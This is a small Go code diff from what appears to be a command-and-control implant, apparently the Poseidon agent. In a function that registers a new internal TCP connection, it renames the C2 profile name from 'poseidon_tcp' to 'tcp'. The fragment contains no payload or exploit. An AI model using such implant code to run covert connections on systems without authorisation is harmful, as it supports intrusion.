@@ -35,7 +35,7 @@ func Run(task structs.Task) {
 		return
 	}
 	task.Job.AddInternalConnectionChannel <- structs.AddInternalConnectionMessage{
-		C2ProfileName: "poseidon_tcp",
+		C2ProfileName: "tcp",
 		Connection:    &conn,
 	}
 	msg.UserOutput = "Successfully Connected"
